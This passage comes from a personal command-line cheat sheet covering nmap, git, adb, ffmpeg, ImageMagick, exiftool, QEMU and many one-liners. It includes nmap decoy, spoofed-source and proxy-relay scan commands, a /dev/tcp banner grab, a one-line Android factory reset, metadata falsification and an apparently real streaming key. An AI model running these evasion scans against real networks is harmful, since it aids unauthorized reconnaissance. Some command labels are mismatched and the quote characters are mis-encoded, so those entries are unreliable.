(*) Send scans from spoofed IPs: `nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1`
(*) Above example explained: `nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip`
(*) Scan Facebook from Microsoft (-e eth0 -Pn may be required): `nmap -S www.microsoft.com www.facebook.com`
(*) Use given source port number: `nmap -g 53 192.168.1.1`
(*) Relay connections through HTTP/SOCKS4 proxies: `nmap --proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1`
(*) Appends random data to sent packets: `nmap --data-length 200 192.168.1.1`

Output
------
(*) Normal output to the file normal.file: `nmap 192.168.1.1 -oN normal.file`
(*) XML output to the file xml.file: `nmap 192.168.1.1 -oX xml.file`
(*) Grepable output to the file grep.file: `nmap 192.168.1.1 -oG grep.file`
(*) Output in the three major formats at once: `nmap 192.168.1.1 -oA results`
(*) Grepable output to screen.: `nmap 192.168.1.1 -oG -`
(*) Append a scan to a previous scan file: `nmap 192.168.1.1 -oN file.file --append-output`
(*) Increase the verbosity level (use -vv or more for greater effect): `nmap 192.168.1.1 -v`
(*) Increase debugging level (use -dd or more for greater effect): `nmap 192.168.1.1 -d`
(*) Display the reason a port is in a particular state, same output as -vv: `nmap 192.168.1.1 --reason`
(*) Only show open (or possibly open) ports: `nmap 192.168.1.1 --open`
(*) Show all packets sent and received: `nmap 192.168.1.1 -T4 --packet-trace`
(*) Shows the host interfaces and routes: `nmap --iflist`
(*) Resume a scan: `nmap --resume results.file`

Helpful Nmap Output Examples
----------------------------
(*) Scan for web servers and grep to show which IPs are running web servers: `nmap -p80 -sV -oG - --open 192.168.1.1/24 | grep open`
(*) Generate a list of the IPs of live hosts: `nmap -iR 10 -n -oX out.xml | grep "Nmap" | cut -d " " -f5 > live-hosts.txt`
(*) Append IP to the list of live hosts: `nmap -iR 10 -n -oX out2.xml | grep "Nmap" | cut -d " " -f5 >> live-hosts.txt`
(*) Append IP to the list of live hosts: `ndiff scanl.xml scan2.xml`
(*) Convert nmap xml files to html files: `xsltproc nmap.xml -o nmap.html`
(*) Convert nmap xml files to html files: `grep " open " results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less`

Miscellaneous Options
---------------------
(*) Discovery only on ports x, no port scan: `nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn`
(*) Arp discovery only on local network, no port scan: `nmap 192.168.1.1-1/24 -PR -sn -vv`
(*) Traceroute to random targets, no port scan: `nmap -iR 10 -sn -traceroute`
(*) Query the Internal DNS for hosts, list targets only: `nmap 192.168.1.1-50 -sL --dns-server 192.168.1.1`

Fonts
=====

(*) Search for installed fonts: `fc-list`
(*) How to find out what fonts `st` is using: `lsof -p $(ps -o pid --no-headers -C st) | grep fonts`

Git
===

(*) Take a look at a different branch: `git checkout name-of-branch`
(*) Stage files from another branch: `git checkout NAMEOFTHEBRANCH FILE1 FILE2`
(*) Revert a file to two commits back: `git checkout HEAD~2 -- file1/to/restore`
(*) Revert a file to a specific version (you'll have to find the sha1 first): `git checkout c5f567 -- file1/to/restore file2/to/restore`
(*) Filter out untracked files: `git status --untracked-files=no`
(*) Use `compact-summary` to compare two branches with a simple summary: `git diff --compact-summary <branch1> <branch2>`
(*) Use the `-b` switch to make a new branch and carry over staged files.: `git checkout -b name-of-new-branch`
(*) See where settings are coming from: `git config --show-origin --list`
(*) Nice git aliases to visualize git log: `git config --global alias.lg2 "log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n''%C(white)%s%C(reset) %C(dim white)- %an%C(reset)' --all"`

Android ADB and Droidcam
========================

(*) Launches camera via adb: `adb shell "input keyevent KEYCODE_CAMERA"`
(*) Lists keys: `adb shell getevent -pl`
(*) List installed packages: `adb shell pm list packages`
(*) Open application: `adb shell monkey -p com.dev47apps.droidcamx 1`
(*) Send on/off key press (activates screen): `adb shell input keyevent 26`

(*) List all sinks (or other types - sinks are outputs and sink-inputs are active audio streams): `pactl list sinks short`
(*) Change the default sink (output) to 1 (the number can be retrieved via the `list` subcommand): `pactl set-default-sink 1`
(*) Move sink-input 627 to sink 1: `pactl move-sink-input 627 1`
(*) Set the volume of sink 1 to 75%: `pactl set-sink-volume 1 0.75`
(*) Toggle mute on the default sink (using the special name `@DEFAULT_SINK@`): `pactl set-sink-mute @DEFAULT_SINK@ toggle`

Image Magick
============

(*) List all fonts available to ImageMagick: `convert -list fonts`
(*) Change all white pixels in an image to transparent (needs to PNG!): `convert test.png -transparent white transparent.png`
(*) "Diff" two images (first shows the result as a PNG, second as a PDF): `compare image1 image2 -compose src diff.png`
(*) Changing all JPGs to a width of 120px and save as PNG: `magick '*.jpg' -resize 120x thumbnail%03d.png`
(*) Extract text from an image (requires `tesseract`): `convert -colorspace gray -fill white -resize 480% -sharpen 0x1 in.png out.jpg && tesseract out.jpg out.txt`
(*) Replace transperancy with white background: `convert -flatten img1.png img1-white.png`
(*) Convert all images in directory to 25% of original size and put all converted images into subdirectory: `mogrify -scale 25% -path ./thumbs *.*`
(*) Crop an image: `convert image.png -crop 200x300+20+20 cropped.png`
(*) Calculate a hash of image data (ImageMagick): `identify -quiet -format "%#" "./path/to/file"`

Exiftool
========

(*) Remove all cached images for icons related to your profile: `DEL /F /S /Q /A %LocalAppData%\Microsoft\Windows\Explorer\thumbcache_*.db`
(*) Print DateTimeOriginal from EXIF data for all files in folder: `for i in *.jpg; do identify -format %[EXIF:DateTimeOriginal] $i; echo; done`
(*) Manipulate the metadata and edit the create time (This will change date to 1986:11:05 12:00 - Date: 1986 5th November, Time: 12.00) and then it will set modify date to the same as alldate.: `exiftool "-AllDates=1986:11:05 12:00:00" a.jpg; exiftool "-DateTimeOriginal>FileModifyDate" a.jpg`
(*) Manipulate the metadata when the photo was taken, this will shift with +15hours + 30min: `exiftool "-DateTimeOriginal+=0:0:0 15:30:0" a.jpg`
(*) Extract all GPS positions from a AVCHD video.: `exiftool -ee -p "$gpslatitude, $gpslongitude, $gpstimestamp" a.m2ts`
(*) Exiftool adjust Date & Time of pictures: `"exiftool(-k).exe" "-DateTimeOriginal-=0:0:0 0:25:0" .`
(*) Use CreationDate metadata on .mov files to rename and modify the created/modify file dates on Mac: `exiftool '-MDItemFSCreationDate<CreationDate' '-FileModifyDate<CreationDate' '-filename<CreationDate' -d %Y-%m-%d_%H-%M-%S%%+c.%%le . -ext mov`
(*) Edit Camera Model in metadata:: `exiftool -model="Samsung Galaxy S11 PRO EDITION " a.jpg`

FFmpeg (simple)
=====================

(*) A good x264 read: `x264 --fullhelp`
(*) Convert a video using CRF (constant rate factor; 0 is lossless, 24 is good, 40 is painful but passable) `ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4`
(*) Convert video for max compatibility and web viewing (2019): `ffmpeg -i final3.mp4 -c:v libx264 -crf 40 -profile:v baseline -level 3.0 -pix_fmt yuv420p -movflags faststart final3_264.mp4`
(*) Clip a video starting at 35 min 10 sec to 37 min 29 sec: `ffmpeg -ss 00:35:10 -i original.mp4 -to 00:37:29 -c copy out.mp4`
(*) Clip a video starting at 35 min 10 sec, 1 min 34 sec duration: `ffmpeg -ss 00:35:10.0 -i input.wmv -t 00:01:34 -c copy output.wmv`
(*) Flip a video horizontally (this way: <->): `ffmpeg -i original.mp4 -vf hflip original_flipped.mp4`
(*) Stabilize a video: `ffmpeg -i video.mp4 -vf vidstabtransform=smoothing=30 video_stab.mp4`
(*) Extract ALL frames from a video: `ffmpeg -i file.mpg $filename%03d.bmp`
(*) Extract frames from a video: `ffmpeg -i file.mpg -r 1/1 $filename%03d.bmp`
(*) Lossless conversion of a movie to mkv, adding cover art: `ffmpeg -i in.mkv -i cover.jpg -map 0 -map 1 -c copy -c:v:1 png -disposition:v:1 attached_pic -sameq out.mkv`
(*) Video to gif (start at 30 seconds, 3 sec duration): `ffmpeg -ss 30 -t 3 -i VIDEO.mp4 -vf "fps=10,scale=320:-1:flags=lanczos,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse" -loop 0 OUTPUT.gif`
(*) Output keyframes from all source files: `ffmpeg -skip_frame nokey -i *.mp4 -vsync 0 -r 30 -f image2 t%02d.tiff`
(*) Run ffmpeg in the bg and divert messages: `ffmpeg -nostdin example.mkv &> log.txt &`

(*) Combine multiple images into a video using ffmpeg: `ffmpeg -start_number 0053 -r 1/5 -i IMG_%04d.JPG -c:v libx264 -vf fps=25 -pix_fmt yuv420p out.mp4`

Concatenate two or more videos read from a file:
`$ cat mylist.txt`
   file '/path/to/file1'
   file '/path/to/file2'
   file '/path/to/file3'
`ffmpeg -f concat -safe 0 -i mylist.txt -c copy output.mp4`

Noise-reducing pre-built models:
Reduce background noise:
https://superuser.com/questions/733061/reduce-background-noise-and-optimize-the-speech-from-an-audio-clip-using-ffmpeg

(*) Use a highpass/lowpass filter (e.g. to enhance speech): `ffmpeg -i <nput_file> -af "highpass=f=200, lowpass=f=3000" <output_file>`
(*) Use RNNoise-Models to enhance speech-based audio ( https://github.com/GregorR/rnnoise-models ): `ffmpeg -i input.mp4 -af "arnndn=m=bd.rnnn" -c:v copy denoised.mp4`
(*) Volume boost: `ffmpeg -i denoised.mp4 -af "volume=4" -c:v copy boosted.mp4`

Live video, downloading video, and ffmpeg streaming
===================================================

Loop stream a video on the local network (only tested on Windows):
{{{sh
  ffmpeg
  -stream_loop -1 -i .\campfire.mkv
  -preset ultrafast -vcodec libx264
  -tune zerolatency -b 900k -f mpegts
  udp://localhost:1234
}}}
  (`mpv udp://localhost:1234` plays it, as an example.)

(*) Get stream URIs with youtube-dl: `youtube-dl -g "URL"`
(*) Grab a video with youtube-dl but limit the size of the video to 1920x?: `youtube-dl -f 'bestvideo[width<=1920]+bestaudio' $URI`
(*) Grab audio only with youtube-dl: `youtube-dl -f bestaudio --add-metadata --extract-audio --audio-format mp3 --audio-quality 0 <Video-URL>`

(*) Write file and also play it (audio only): `ffmpeg -i "https://chillout.zone/chillout_plus" -map 0 -c:a copy -f tee "output.flac|[f=nut]pipe:" | ffplay pipe:`
(*) Write file and also play it (video + audio): `ffmpeg -f v4l2 -i /dev/video0 -map 0 -c:v libx264 -f tee "output.mp4|[f=nut]pipe:" | ffplay pipe:`
(*) Screen capture with mic input (ALSA): `ffmpeg -f x11grab -s 1440x900 -i :0.0 -f alsa -i hw:0 out.mkv`

Youtube streaming (replace $FPS with 24 or the like):
{{{sh
FPS=24 && ffmpeg \
	-stream_loop -1 \
	-re -i "VIDEO_SOURCE" \
	-c:v libx264 -pix_fmt yuv420p -preset superfast -r $FPS -g $(($FPS * 2)) -b:v 1500k \
	-c:a aac \
	-f flv "YOUTUBE_URL/KEY"
}}}

Another one:
{{{sh
ffmpeg \
	-stream_loop -1 -re \
	-f dshow -rtbufsize 100M -i video="Integrated Camera" \
	-f dshow -i audio="Microphone Array (Realtek(R) Audio)" \
	-c:v libx264 -pix_fmt yuv420p -preset superfast -r 24 -g 48 \
	-b:v 1500k -c:a aac \
	-f flv "rtmp://a.rtmp.youtube.com/live2/gejs-ux1t-xs6h-taa5-4k4x"
}}}

Screen capture, capture default audio out:
{{{sh
ffmpeg \
  -video_size 1366x768 \
  -framerate 30 \
  -f x11grab -i :0.0 \
  -f pulse -ac 2 -i default \
  -c:v libx264rgb -crf 0 -preset ultrafast\
  -c:a libopus output.mkv
}}}

Another good screen capture oneliner:

{{{sh
ffmpeg -framerate 60 \
	-f x11grab -thread_queue_size 1024 -i :0.0 \
	-f pulse -ac 2 -i default \
	-c:v libx264rgb \
	-c:a libopus -crf 0 -preset ultrafast -b:a 160k \
	output.mkv
}}}

Screen capture again. I'm not sure what this one was (webcam inset, desktop capture?)
{{{sh
ffmpeg -f x11grab -thread_queue_size 64 -video_size 1920x1080 -framerate 30 -i :1 \
       #-f v4l2 -thread_queue_size 64 -video_size 320x180 -framerate 30 -i /dev/video42 \
       -filter_complex 'overlay=main_w-overlay_w:main_h-overlay_h:format=yuv444' \
       -vcodec libx264 -preset ultrafast -qp 0 -pix_fmt yuv444p \
       video.mkv
}}}

(*) ffmpeg fade from video 1 to video 2 (start at 20 seconds for 2 sec): `ffmpeg -i video1.mp4 -i video2.mp4 -filter_complex "xfade=offset=20:duration=2" v1_to_v2.mp4`

FFMPEG transition effects:
â€˜customâ€™ â€˜fadeâ€™ â€˜wipeleftâ€™ â€˜wiperightâ€™ â€˜wipeupâ€™ â€˜wipedownâ€™ â€˜slideleftâ€™ â€˜sliderightâ€™ â€˜slideupâ€™
â€˜slidedownâ€™ â€˜circlecropâ€™ â€˜rectcropâ€™ â€˜distanceâ€™ â€˜fadeblackâ€™ â€˜fadewhiteâ€™ â€˜radialâ€™
â€˜smoothleftâ€™ â€˜smoothrightâ€™ â€˜smoothupâ€™ â€˜smoothdownâ€™ â€˜circleopenâ€™ â€˜circlecloseâ€™
â€˜vertopenâ€™ â€˜vertcloseâ€™ â€˜horzopenâ€™ â€˜horzcloseâ€™ â€˜dissolveâ€™ â€˜pixelizeâ€™ â€˜diagtlâ€™
â€˜diagtrâ€™ â€˜diagblâ€™ â€˜diagbrâ€™ â€˜hlsliceâ€™ â€˜hrsliceâ€™ â€˜vusliceâ€™ â€˜vdsliceâ€™ â€˜hblurâ€™
â€˜fadegraysâ€™ â€˜wipetlâ€™ â€˜wipetrâ€™ â€˜wipeblâ€™ â€˜wipebrâ€™ â€˜squeezehâ€™ â€˜squeezevâ€™

(*) Inset video. This will set lights.mp4 as the main video with street.mp4 an inset video in the lower right corner: `ffmpeg -i lights.mp4 -i street.mp4 -filter_complex 'overlay=main_w-overlay_w+(1920-192*2.5):main_h-overlay_h+(1080-108*2.5)' -t 5 output.mp4`

Combine a video and an audio stream simultaneously:
{{{sh
ffmpeg \
	-i "https://ycradio.stream.publicradio.org/ycradio.aac" \
	-i "$HOME/Videos/new_zealand_na_small.mp4" \
	-c:a aac -c:v copy \
	-map 0:a:0 -map 1:v:0 \
	-f matroska out.mkv
}}}

Play a video that contains audio, MERGE with an audio stream:
{{{sh
ffmpeg \
	-i "https://hygge.stream.publicradio.org/hygge.aac" \
	-i "/home/marian/Videos/walk_in_the_rain.mp4" \
	-c:a aac \
	-c:v copy \
	-filter_complex "[0:a][1:a]amerge=inputs=2[aout]" \
	-map "[aout]" \
	-map 1:v:0 \
	-f matroska - | ffplay -
}}}

Visual spectrograph of an audio stream:
{{{sh
ffmpeg -i "https://nightride.fm/stream/nightride.m4a" \
	-filter_complex "[0:a]avectorscope=s=480x480:zoom=1.5:rc=0:gc=200:bc=0:rf=0:gf=40:bf=0,format=yuv420p[v]; [v]pad=854:480:187:0[out]" \
	-map "[out]" -map 0:a \
	-b:v 700k -b:a 360k \
	-f matroska \
	- | ffplay -
}}}

ffmpeg and Windows
==================

`gdigrab` works out of the box but better alternatives exist: https://trac.ffmpeg.org/wiki/Capture/Desktop#Windows
(*) (Windows) Get names of devices for commands below: `ffmpeg -list_devices true -f dshow -i dummy`
(*) (Windows) Play borderless webcam (mpv): `mpv -border=no -no-osc --ontop av://dshow:video="NAMEOFWEBCAM"`
(*) (Windows) Play borderless webcam (ffplay): `ffplay -noborder -probesize 32 -sync ext -f dshow -i video="Integrated Camera" -vf scale=320:-1`
(*) (Windows) Capture desktop using gdigrab: `ffmpeg -f gdigrab -framerate 30 -i desktop -f dshow -i audio="NAMEOFMICROPHONE" -c:v libx264rgb -crf 0 -preset ultrafast output.mkv`
(*) (Windows) Capture a region of the desktop: `ffmpeg -f gdgrab -framerate 6 -offset_x 10 -offset_y 20 -video_size vga -i desktop out.mpg`
(*) (Windows) Capture a window by window title: `ffmpeg -f gdigrab -framerate 6 -i title=Calculator out.mpg`
(*) (Windows) Capture desktop using a virtual device (need 3rd party - see trac URL above): `ffmpeg -f dshow -i video="UScreenCapture" -f dshow -i audio="NAMEOFMICROPHONE" output.mkv`

gdigrab only (it's passable)

Borderless (and movable) webcam stream with good latency (no sound)
1. Get AutoHotkey, and enable WinDrag.ahk ( https://wwwautohotkey.com/boards/viewtopic.php?t=57703 )
2. List video devices: `ffmpeg -list_devices true -f dshow -i dummy`
3. Play a borderless stream (see above)

Other cool programs and their magic
===================================

(*) Print all colours in terminal: `(x=$(tput op) y=$(printf %76s);for i in {0..256};do o=00$i;echo -e ${o:${#o}-3:3} $(tput setaf $i;tput setab $i)${y// /=}$x;done)`
(*) Remove ANSI colour escape codes from a file: `sed 's/\x1b\[[0-9;]*m//g' file.txt`
(*) Output the final destination of a URL: `curl -Ls -o /dev/null -w %{url_effective} https://startingurlgoeshere`
(*) Watch CPU usage, update once per sec: `watch -n1 grep \"cpu MHz\" /proc/cpuinfo`
(*) Get device info for all USB devices: `echo /sys/bus/usb/devices/* | xargs udevadm info -q property -p`
(*) Output text on to the clipboard: `echo "hello" | xclip -i -sel clip`
(*) Get text from the clipboard: `xclip -o -sel clip`
(*) Download an entire website: `wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com`
(*) Download a single page saved as `wget_result.html`, implementing a custom user-agent: `wget -O wget_result.html --user-agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.58 Safari/537.36" "https://ca.camelcamelcamel.com/search?sq=rk+royal+kludge"`
(*) lynx - Get a text-only version of a website: `lynx -dump "URL" >> dump.txt`
(*) Magnify a mouse-selected part of a screen: `slop | xargs xzoom -source`
(*) To find out fonts that the `brave` browser is using: `for proc in $(ps -o pid --no-headers -C brave); do (lsof -p $proc | grep fonts | cut -f4); done`
(*) sxiv - Search directory for files and run them as a slideshow: `sxiv -S 2 -i <<< $(find . -type f)`
(*) Boot a flash disk in QEMU to test it: `qemu-system-x86_64 -rtc base=localtime -m 2G -vga std -drive file=/dev/sdb,readonly,cache=none,format=raw,if=virtio`

(*) Display information about key presses: `showkey -a`
(*) Show information about a window by clicking on it: `xwininfo`
(*) Send specific key strokes to a window: `xdotool`
(*) Fetch specific window properties: `xprop`

(*) Fetch current outside temperature at location bc-32 (Canada, see weather.gc.ca): `curl -s https://weather.gc.ca/rss/city/bc-32.xml | grep -oP '(?<=Current Conditions: )\d{1,}\.\d{1,}'`
(*) Convert a website into a PDF: `wkhtmltopdf "https://weather.gc.ca/city/pages/bc-32_metric_e.html" - | zathura -`

Powershell
==========

Because sometimes you gotta use the Windoze.

Pipe is unusable (https://gitub.com/PowerShell/PowerShell/issues/1908)
Re-directs sometimes work (<, >, etc.)
Subshell works (e.g. $(Get-Clipboard) )

Powershell                          *Nix
--------------------------------------------
Get-Clipboard                       xclip
Get-Content OR cat                  cat
Compare-Object OR diff              diff
Get-PnpDevice -PresentOnly          lsdev (or, lsusb, etc.)

Other guides
============

Push and pull with git using SSH
--------------------------------

  You need a SSH key pair to start.
  Check `~/.ssh` for one, or put one there if you have one on another machine.
   found that unless my key is called `id_rsa.pub`, then SSH/Github will ask for password EVERY time anyway!

  1. Copy the public key to the clipboard: `cat ~/.ssh/id_rsa.pub | xclip -i -sel clipboard``
  2. Change git remote:
             `git remote set-url origin git@github.com:USERNAME/NAMEOFREPO.git`
       Push to all branches (and tags) - assuming origin is the destination remote
          `git push --all origin`

  These are GitHub's public key fingerprints:
  SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 (RSA)
  SHA256:br9IjFspm1vxR3iA35FWE+4VTyz1hYVLIE2t1/CeyWQ (DSA)

QEMU: Run a VM not using virt-manager
-------------------------------------

  * Check for virtualization and kernel support for KVM
  * Install `QEMU` and a *libvert* frontend like `virt-viewer`
  * Install `edk2-ovmf` package to enable UEFI
  * Create a drive with `qemu-img create -f raw myVM 20G` (put it somewhere smart, like a VM folder)
  * Run the guest with a live ISO loaded, 4G of ram, KVM enabled, on UEFI
  *    `qemu-system-x86_64 -cdrom path/to/ISO -enable-kvm -bios /usr/share/edk2-ovmf/x64/OVMF.fd -boot order=d -m 4G -cpu host -smp 2 -drive file=path/to/myVM,format=raw`
  * Load VM, pressing `ESC` multiple times to enter BIOS menu. Add the bootloader (GRUB?) as an option to the boot menu.
  * Fire it up! `qemu-system-x86_64 -enable-kvm -bios /usr/share/edk2-ovmf/x64/OVMF.fd -m 4G -cpu host -smp 2 -drive file=path/to/myVM,format=raw`

QEMU: Run a VM using virt-manager
---------------------------------

  Handy for win10: `https://dennisnotes.com/note/20180614-ubuntu-18.04-qemu-setup/`

  * Install `pacman -S qemu virt-manager virt-viewer dnsmasq vde2 bridge-utils openbsd-netcat`
  * enable libvirtd service `systemctl enable --now libvertd`
  * Add user to libvert group `usermod -aG libvirt USERNAME`
  * reboot
  * Run `virt-manager`
  * Also necessary for network (unverified!):
    {{{sh
    virsh net-autostart default
    virsh net-start default
    }}}

Run VirtualBox Arch Linux headless on Windows and ssh into it
-------------------------------------------------------------

  Create a virtual machine using your preferred settings

  Virtual machine: enable `sshd` (systemctl, etc.)

  VirtualBox > Machine Settings > Network > Advanced
  Under port forwarding add the entry:

  Name    Protocol    Host IP    Host Port    Guest IP    Guest Port
  ----    --------    ---------  ---------    --------    ----------
  SSH     TCP         127.0.0.1  2222         10.0.2.15   22

  Now, turn on the machine (here, headless):
  `"C:\Program Files\VirtualBox\VBoxManage.exe" startvm Arch --type headless`

  SSH into the machine (the above settings will forward your request to 22)
  `ssh user@127.0.0.1 -p 2222`

Run a simple X server and connect to it
---------------------------------------
  * install `tigervnc`
  * run `vncpasswd` which encrypts and stores your password in `~/.vnc/passwd`
  * run `x0vncserver -rfbauth ~/.vnc/passwd`

Send mail in the command line using msmtp
-----------------------------------------

  {{{sh
  printf "To: recipient@somedomain.com\n \
  From: sender@email.com\n \
  Subject: Something important\n\n \
  This is the body of the message" \
  | msmtp -a account_name recipient@somedomain.com`
  }}}

(*) Send mail in the command line using neomutt: `neomutt -e 'set content_type="text/html"' user@mail.com -s "subject" < email.html``

New oneliners (thanks commandlinefu)
====================================

(*) Scrape commandlinefu with: `URL="http://www.commandlinefu.com" && wget -O - --save-cookies c $URL && for i in {0..564};do wget -w 8 --random-wait -O - --load-cookies c $URL/commands/browse/plaintext/$i >> ~/commands.txt ;done;rm -f c`

(*) Recall â€œNâ€th command from your BASH history without executing it.: `!12:p`
(*) Learn the difference between single and double quotes: `a=7; echo $a; echo "$a"; echo '$a'; echo "'$a'"; echo '"$a"'`
(*) Bash alias to output the current Swatch Internet Time: `alias beats='echo '\''@'\''$(TZ=GMT-1 date +'\''(%-S + %-M * 60 + %-H * 3600) / 86.4'\''|bc)'`
(*) Start a game on the discrete GPU (hybrid graphics): `alias game='DRI_PRIME=1'`
(*) Replacement of tree command (ignore node_modules): `alias tree='pwd;find . -path ./node_modules -prune -o -print | sort | sed '\''1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'\'''`
(*) Open clipboard content on vim: `alias vcb='xclip -i -selection clipboard -o | vim -'`
(*) Faciliate the work for lftp ('all' is needed if you wanna use it with getopts, otherwise its enough with the lftp line): `all="$(echo -e $*|awk '{for(i=3;i<=NF;++i)print $i}'|xargs)"; lftp -e open <HOSTNAME> -p <PORT> -u <USER>:<PASSWORD> -e "$all;exit"`
(*) Factory reset your android device via commandline.: `am broadcast -a android.intent.action.MASTER_CLEAR`
(*) Before any Dell Firmware update on Ubuntu, run: `apt install raidcfg dtk-scripts syscfg smbios-utils sfcb cim-schema dcism`
(*) Get all upgradable deb packages in a single line: `apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'`
(*) Split video files using avconv along keyframes: `avconv -i SOURCE.mp4 -f segment -c:v copy -bsf:v h264_mp4toannexb -an -reset_timestamps 1 OUTPUT_%05d.h264`
(*) Print lines in a text file with numbers in first column higher or equal than a value: `awk '$NF >= 134000000 {print $0}' single-column-numbers.txt`
(*) Change values from 0 to 100: `awk '{if ($3 =="LAN" && $5 == "0.00" ) print $1,Â  $2, "LAN",Â  "288",Â  "100.00"; else print $1 ,$2, $3, $4, $5 }' sla-avail-2013-Feb > sla-avail-2013-Feb_final`
(*) Use was ec2 describe instances to retrieve IAM roles for specific ec2 tag to css list: `aws ec2 describe-instances --region us-east-1 --filters "Name=tag:YourTag,Values=YourValue" |  jq '.["Reservations"]|.[]|.Instances|.[]|.IamInstanceProfile.Arn + "," +.InstanceId'`
(*) Get a list of stale AWS security groups: `aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' --output text  |xargs -t -n1 aws ec2 describe-stale-security-groups --vpc-id`
(*) Rclone - include Service account blobs to your config: `bash -c 'COUNT=0; for i in $(find . -iname "*.json");do ((count=count+1));VAL=`cat ${i} | jq -c '.'` ; echo "[dst$count]";echo "type = drive";echo "scope = drive";echo "service_account_credentials = $VAL" ; echo "team_drive = 0AKLGAlhvkJYyUk9PVA" ;done'`
(*) Banner Grabber: `bash -c 'exec 3<>/dev/tcp/google.com/80; echo EOF>&3; cat<&3'`
(*) Show which line of a shell script is currently executed: `bash -x foo.sh`
(*) Calculate pi to an arbitrary number of decimal places: `bc -l <<< "scale=1000; 4*a(1)"`
(*) List the binaries installed by a Debian package: `binaries () { dpkg -L "$1" | grep -Po '.*/bin/\K.*'; }`
(*) List the binaries installed by a Debian package: `binaries () { for f in $(dpkg -L "$1" | grep "/bin/"); do basename "$f"; done; }`
(*) Add keybindings for cycling through completions (or for inserting the last or first completion) in Bash: `bind '"\er":menu-complete-backward';bind '"\es":menu-complete'`
(*) Bitcoin Brainwallet Private Key Calculator: `bitgen hex 12312381273918273128937128912c3b1293cb712938cb12983cb192cb1289b3 info`
(*) Extracts blocks from damaged .bz2 files: `bzip2recover damaged_file_name`
(*) AWK Calculator: `calc(){ awk "BEGIN{ print $* }" ;}; calc "((3+(2^3)) * 34^2 / 9)-75.89"`
(*) Shell pocket calculator (pure sh): `calc(){ printf "%.8g\n" $(printf "%s\n" "$*" | bc -l); }`
(*) Convert JSON object to JavaScript object literal: `cat data.json | json-to-js | pbcopy`
(*) Generate cryptographically Secure RANDOM PASSWORD: `cat /dev/urandom |tr -c -d '[:alnum:]'|head -c 16;echo`
(*) Extract a Zip File from STDOUT with the Jar Command: `cat foo.zip | jar xv`
(*) Convert tab separate file (TSV) to JSON with jq: `cat input.tsv | jq --raw-input --slurp 'split("\n") | map(split("\t")) | .[0:-1] | map( { "id": .[0], "ip": .[1] } )'`
(*) SFTP upload through HTTPS proxy: `cat myFile.json | ssh root@remoteSftpServer -o "ProxyCommand=nc.openbsd -X connect -x proxyhost:proxyport %h %p" 'cat > myFile.json'`
(*) Batch-Convert text file containing youtube links to mp3: `cat playlist.txt | while read line; do youtube-dl --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" ytsearch:"$line"  ;done`
(*) Parse and format IP:port currently in listen state without net tools: `cat /proc/net/tcp | grep " 0A " | sed 's/^[^:]*: \(..\)\(..\)\(..\)\(..\):\(....\).*/echo $((0x\4)).$((0x\3)).$((0x\2)).$((0x\1)):$((0x\5))/g' | bash`
(*) Check whether laptop is running on battery or cable: `cat /sys/class/power_supply/AC/online`
(*) Print your cpu intel architecture family: `cat /sys/devices/cpu/caps/pmu_name`
(*) Convert epoch date to human readable date format in a log file.: `cat /var/log/mosquitto/mosquitto.log | awk -F : '{"date -d @"$1 |& getline D; print D, $0}'`
(*) Backup with versioning: `& 'C:\cwRsync_5.5.0_x86_Free\bin\rsync.exe' --force --ignore-errors --no-perms --chmod=ugo=rwX --checksum --delete --backup --backup-dir="_EVAC/$(Get-Date -Format "yyyy-MM-dd-HH-mm-ss")" --whole-file -a -v "//MyServer/MyFolder" "/cygdrive/c/Backup"`
(*) Get the full path of a bash script's Git repository head.: `(cd "$(dirname "${BASH_SOURCE[0]}")" && git rev-parse --show-toplevel)`
(*) Access folder "-": `cd -- -`
(*) Jump to home dir and list all, not older than 3 days, with full-path, hidden/non-hidden files/subdirectories: `cd && tree -aicfnF --timefmt %Y%j-%d-%b-%y|grep $(date +%Y%j)'\|'$[$(date +%Y%j)-1]'\|'$[$(date +%Y%j)-2]`
(*) Set a user password without passwd: `chpasswd <<< "user:newpassword"`
(*) Clear terminal Screen: `clear`
(*) Convert & rename all filenames to lower case: `convmv --lower --notest FILE`
(*) After typing lots of commands in windows, save them to a batch file quickly: `copy con batchfilename.bat`
(*) Remove multiple entries of the same command in .bash_history with preserving the chronological order: `cp -a  ~/.bash_history ~/.bash_history.bak && perl -ne 'print unless $seen{$_}++'  ~/.bash_history.bak >~/.bash_history`
(*) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -d @$(stat -c '%Y' file) "+%y%m%d")}`
(*) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -r file "+%y%m%d")}`
(*) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file file.$(date -d @$(stat -c '%Y' file) "+%y%m%d")`
(*) Clear terminal Screen: `<ctrl+l>`
(*) Get your public IP address using Amazon: `curl checkip.amazonaws.com`
(*) Ultra fast public IP address lookup using Cloudflare's 1.1.1.1: `curl -fSs https://1.1.1.1/cdn-cgi/trace | awk -F= '/ip/ { print $2 }'`
(*) Download mp3 files linked in a RSS podcast feed: `curl http://radiofrance-podcast.net/podcast09/rss_14726.xml | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*mp3" | sort -u | xargs wget`
(*) Offcloud - add a link as remote download: `curl  'https://offcloud.com/api/remote?key=XXXXXX' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw "url=$MYLINK&remoteOptionId=XXXXX"`
(*) Check web server port 80 response header: `curl -I <IPaddress>`
